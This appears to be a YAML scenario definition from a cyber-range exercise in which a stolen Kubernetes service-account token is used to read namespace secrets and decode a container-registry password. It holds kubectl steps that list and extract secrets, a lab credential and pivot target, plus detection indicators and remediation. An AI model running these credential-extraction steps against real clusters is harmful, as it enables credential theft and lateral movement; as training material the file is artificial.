id: red_03_cld-k8s_rbac_overprivilege
name: "Kubernetes RBAC Over-Privilege — Secrets API Credential Exfiltration"
range: RNG-CLD-01
machine: M3-cld-k8s
mitre:
  - technique: T1613
    name: "Container and Resource Discovery"
  - technique: T1552.007
    name: "Unsecured Credentials: Container API"
cwe:
  - CWE-269  # Improper Privilege Management
cvss: "8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)"
description: |
  The cloud-ci-runner-role Kubernetes RBAC Role in the pul-cloud namespace grants
  get,list permissions on the secrets API resource. Combined with the stolen static
  service account token (from M2 kubeconfig), an attacker can read all Secrets
  in the namespace including registry-creds, yielding credentials for M4.
entry_condition: "K8s SA token: pul-cloud-ci-runner-token-2024gridfall (from M2 kubeconfig)"
prereqs:
  - kubeconfig pointing to 11.0.2.30:6443
  - Stolen static SA token
steps:
  - id: 1
    name: "Verify API access"
    cmd: "KUBECONFIG=./cloud-ci-kubeconfig.yaml kubectl cluster-info"
  - id: 2
    name: "Check permissions"
    cmd: "kubectl auth can-i --list -n pul-cloud"
  - id: 3
    name: "List secrets"
    cmd: "kubectl get secrets -n pul-cloud"
  - id: 4
    name: "Extract registry credentials"
    cmd: "kubectl get secret registry-creds -n pul-cloud -o jsonpath='{.data.password}' | base64 -d"
output:
  credential: "registry-admin:Reg!stry@CLD2024 @ 11.0.2.40:5000"
  next_target: "M4 Container Registry (11.0.2.40:5000)"
artifacts:
  - "journalctl -u k3s"
  - "/etc/rancher/k3s/tokens.csv"
  - "kubectl get role cloud-ci-runner-role -n pul-cloud -o yaml"
detection_indicators:
  - "SA token pul-cloud-ci-runner used from unexpected source IP"
  - "GET /api/v1/namespaces/pul-cloud/secrets in K3s audit log"
remediation:
  - "Remove secrets from cloud-ci-runner-role resources list"
  - "Replace static long-lived token with projected service account tokens"
  - "Enable Kubernetes Audit Policy for secrets operations"
  - "Implement Kyverno policy blocking CI roles from secrets access"
